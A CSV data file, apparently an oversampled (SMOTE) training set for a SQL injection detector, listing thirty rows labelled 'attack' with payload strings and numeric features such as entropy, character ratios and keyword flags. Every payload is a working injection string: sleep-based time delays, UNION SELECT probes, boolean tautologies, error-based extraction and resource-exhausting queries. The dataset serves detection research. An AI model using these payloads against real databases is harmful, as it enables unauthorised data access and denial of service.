id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000821,attack,time,"1""  )   as mohv where 2171  =  2171 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R006072,0.013952069178317148,111.50270495234183,25.961746534795527,3.3459127223772738,37.77047920877315,10.0,50.77047920877315,12.961746534795525,0.33867161644963956,0.08973421270531942,0.4553260929665548,0.11626807787848621,0.0,1.0,0.0,0.0,1.0,1.0,0.0,8.961746534795525,0.0,0.0,0.0,2.0,0.0,1.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000822,attack,boolean,"1  )   where 7684  =  7684 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R004531,0.02355536945797859,259.650300263546,37.91871246705675,3.8206929640570007,77.4877251976595,35.0,104.1625750658865,43.0,0.29839989163016456,0.13480600249845834,0.40117530280184255,0.16561880306953453,0.0,0.0,2.0,0.0,0.0,2.0,0.0,23.0,0.0,2.0,4.0,14.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000823,attack,union,"-5066'   )    )    union all select 9689,9689,9689,9689#",nearest_attack_euclidean,R007412,0.06911799236183569,56.54185425649745,21.10837085129949,3.733432835610351,14.0,20.43348340519796,14.0,8.10837085129949,0.24777928583402684,0.36107669366543815,0.24777928583402686,0.14336473466650815,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.9999999999999991,0.0,0.0,3.1083708512994903,0.9999999999999996,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000824,attack,time,"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R006285,0.21897437092027874,73.11181169610909,21.267087017665453,3.315042103294733,15.0,18.0,31.68944935688727,8.422362339221818,0.20539711352082352,0.24647653622498822,0.4330238238427953,0.11510252641139294,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.422362339221817,0.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000825,attack,boolean,-2790'   )    )    or 8571  =  8571--,nearest_attack_euclidean,R003769,0.024755370842985756,37.0,14.0,2.9951311739431388,2.0,12.0,15.999999999999996,7.0,0.05405405405405406,0.32432432432432434,0.43243243243243246,0.1891891891891892,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.9999999999999991,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000826,attack,other,1 where 1015  =  1015,nearest_attack_euclidean,R003105,0.011170926965087709,20.999999999999986,9.0,2.8203265091754233,5.0,9.0,6.0,0.9999999999999982,0.23809523809523808,0.42857142857142855,0.2857142857142857,0.047619047619047616,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999996,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000827,attack,error,-6190'  )   where 2621  =  2621 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,nearest_attack_euclidean,R007991,0.088691296184565,423.6143465840721,34.0,3.4829857756712617,105.0,62.0,185.0914772672577,71.52286931681442,0.24787557909667585,0.1463646276570848,0.4369212946183929,0.16883849862784647,1.0,0.0,3.0,0.0,0.0,3.0,0.0,38.522869316814415,0.0,0.0,0.0,32.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.0
SMOTE_000828,attack,union,-7979'+  (  select 'bkvt' where 3613  =  3613 union all select 3613#,nearest_attack_euclidean,R002414,0.23927894649989248,69.80746844359984,28.0,4.194518769503189,29.0,17.445974754879877,15.0,8.361493688719971,0.41591124398380425,0.24927614589730743,0.21512650550886425,0.11968610461002399,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.36149368871996956,3.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000829,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%'  =  '",nearest_attack_euclidean,R008126,0.150383189933044,107.94102122052614,27.0,4.028548114955603,63.627347480350764,5.0,22.31367374017538,17.0,0.5894009144352772,0.04635945133883368,0.2066174996738546,0.15762213455203453,3.0,0.0,0.0,0.0,1.0,1.0,0.0,2.0784184350438446,0.921581564956155,5.0,4.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000830,attack,boolean,end and   (  'nchh'  =  'nchh,nearest_attack_euclidean,R002387,0.07935583701867015,29.495705515556054,10.070815073650866,2.854324117054273,14.0,0.0,10.424890441905184,5.070815073650866,0.47611122871859696,0.0,0.35188196135985633,0.17200680992154677,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0708150736508664,0.0,0.0,0.0,0.9999999999999996,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000831,attack,error,"1%'   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R002602,0.7676705723517024,161.0024996427519,32.874062633968045,3.7779059157822377,54.503749464127836,23.375312455343987,62.87406263396804,20.24937508931203,0.3378628730057421,0.14519757038893763,0.3909540155189427,0.12598554108637755,1.0,0.0,0.0,0.0,0.0,0.0,0.0,13.624687544656014,0.6246875446560141,0.0,4.0,0.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000832,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R003513,0.12004865732594011,188.9841479321953,30.323995649053078,3.6812094047708612,64.0,24.0,76.92812182651377,24.056026105681525,0.34123537748010546,0.12796326655503953,0.40388516997391444,0.12691618599094057,4.0,0.0,0.0,0.0,0.0,0.0,0.0,16.056026105681525,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000833,attack,other,1%' order by 1#,nearest_attack_euclidean,R000858,0.9778910215759047,14.549532609277023,10.54953260927703,3.2596138949389406,7.0,2.0,3.0,2.549532609277028,0.4816822463574324,0.1376234989592664,0.2064352484388996,0.17425900624440166,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5495326092770287,0.0,0.0,0.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,2.0
SMOTE_000834,attack,boolean,1'  )   as dqgr where 2427  =  2427 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R006699,0.0377090934631446,70.0,24.0,3.6488570070562103,14.0,21.0,26.0,9.0,0.2,0.3,0.37142857142857144,0.12857142857142856,1.0,0.0,2.0,0.0,1.0,2.0,0.0,3.0,0.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000835,attack,boolean,"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",nearest_attack_euclidean,R001384,1.4501101266081324,124.83042037251757,27.0,3.89780579977397,62.0,10.0,34.8788716946554,17.951548677862164,0.49823535804467844,0.08036054162010942,0.27804277406226313,0.14336132627294904,0.0,1.0,0.975774338931081,0.0,1.0,1.0,0.0,4.975774338931082,0.0,5.0,4.0,2.975774338931081,0.0,1.0,0.48788716946554045,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000836,attack,time,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R006221,0.7264500313685825,82.07457363622592,24.906000417664366,3.639279655057064,24.995143513472573,12.178286191616417,30.812000835328732,14.08914309580821,0.3047922671984015,0.146036043505877,0.3753122543279267,0.17385943496779485,4.0,0.0,0.0,0.0,0.0,1.2722857739520521,0.0,4.544571547904104,0.0,0.0,0.2722857739520521,5.272285773952052,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,1.0,0.2722857739520521,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.272285773952052
SMOTE_000837,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R005606,0.5379757776055822,66.00260177533028,21.666840118355353,3.8979782619839884,14.0,36.00208142026422,4.0,12.000520355066055,0.2147795712136258,0.5422645145436491,0.06136559177532164,0.1815903224674035,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,7.000520355066054,3.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000838,attack,union,1  )   as ratg where 3033  =  3033 union all select null--,nearest_attack_euclidean,R003390,0.021431119798280746,58.195717240913396,21.055919211689545,3.7767247011878373,29.0,9.0,16.167757635068632,4.027959605844773,0.49849448276220454,0.15470518430551178,0.27761232545871783,0.06918800747356582,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0279596058447726,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000839,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003855,0.0802689674163607,156.52025665766024,35.0,4.313267436345923,77.89019249324517,17.0,43.63006416441506,18.0,0.4974967988607335,0.10867226378145647,0.278766187471562,0.11506474988624803,1.0,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,3.0,5.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000840,attack,boolean,"1%""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R005317,0.15312688530697408,145.89819889227186,29.0,3.8948329940659066,65.0,10.0,46.484170479090174,24.414028413181697,0.4461546065655128,0.06863917024084813,0.31783509096476475,0.16737113222887434,0.0,4.0,0.0,0.0,1.0,2.0,0.0,6.414028413181696,2.0,5.0,4.0,3.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000841,attack,time,"1' where 5786  =  5786 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R008047,0.18108153461100612,72.36926605713762,24.8980791285711,3.5769295880776375,16.305762614286696,17.184633028568815,29.184633028568815,9.694237385713304,0.22756714271738432,0.23602424396216565,0.4027457740913242,0.1336628392291259,1.0,0.0,2.0,0.0,0.0,1.8980791285711018,0.0,3.898079128571102,0.0,0.0,0.8980791285711017,3.898079128571102,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000842,attack,other,1'   )    )    as dckd where 1794  =  1794,nearest_attack_euclidean,R001453,8.429369702178807e-08,42.0,17.0,3.206280814966258,11.0,9.0,18.0,4.0,0.2619047619047619,0.21428571428571427,0.42857142857142855,0.09523809523809523,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.9999999999999991,0.0,0.0,0.0,0.9999999999999996,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000843,attack,boolean,"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R002026,0.4199994002812451,127.0,29.60347372817379,4.069754054732023,71.0,8.534491242724597,33.93101751455081,13.534491242724595,0.5590551181102362,0.06720071844665036,0.26717336625630556,0.10657079718680784,1.0,0.0,0.0,0.0,1.0,1.0,0.0,4.465508757275404,0.0,0.0,2.5344912427245956,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000844,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   '%'  =  '",nearest_attack_euclidean,R002938,0.047682971359752135,123.58012634490511,28.116025268981023,3.8922143058663803,72.0,3.0580126344905114,33.34807580694307,15.174037903471534,0.5828125743118058,0.02472004248472509,0.26973954122331,0.12272784198015906,3.0,0.0,0.0,0.0,1.0,1.0,0.0,4.058012634490511,0.9999999999999999,0.0,2.0580126344905114,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000845,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R007465,0.4021830271332621,63.24840020338307,20.275159979661694,3.70490677912463,14.0,33.79872016270646,4.0,11.449680040676615,0.222543938623549,0.5329472736517412,0.06358398246387115,0.18092480526083865,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,6.449680040676615,3.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000846,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R002706,0.1357812089286227,63.94598562880857,26.0,3.867509111113248,22.94598562880857,10.0,21.0,10.0,0.35882574672151574,0.15638396421426445,0.32840632484995536,0.15638396421426445,3.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,1.0,0.0,0.9459856288085708,0.054014371191429156,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000847,attack,boolean,"1'  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R008397,0.7837419973440664,183.07771148971688,30.629298955480284,3.639205149215669,52.0,27.0,73.70701044519716,30.370701044519716,0.28426812709599303,0.14760075829984254,0.40217921391973266,0.16595190068443172,0.6292989554802849,0.0,2.0,0.0,0.0,1.0,0.0,16.74140208903943,0.0,1.0,3.0,9.0,0.629298955480285,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000848,attack,union,"1   )    )    union all select null,null,null,null#",nearest_attack_euclidean,R001956,0.20505148543193055,48.654056228400265,15.0,3.2080836575867675,29.218018742800087,1.0,12.827028114200132,5.6090093714000435,0.6035682599450963,0.020787302047058726,0.2609460264588251,0.11469841154901994,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8045046857000209,0.0,0.0,2.8045046857000218,0.0,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000849,attack,boolean,"1' and elt  (  4249  =  4249,7259  )   and 'nsbj' like 'nsbj",nearest_attack_euclidean,R005620,0.3914280658765261,56.27179971615122,22.533974964518904,3.7827271705974783,19.60192489355671,11.13589985807561,18.0,7.533974964518903,0.3482075960173804,0.19635275486364448,0.32150884779143524,0.13393080132753987,4.0,0.0,0.0,0.0,0.0,1.0,0.0,1.9999999999999991,0.0,0.0,0.5339749645189027,0.9999999999999996,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000850,attack,other,1' where 8128  =  8128,nearest_attack_euclidean,R001430,0.0,21.999999999999986,10.0,2.992856050160461,5.0,9.0,6.0,2.0,0.22727272727272727,0.4090909090909091,0.2727272727272727,0.09090909090909091,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999996,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
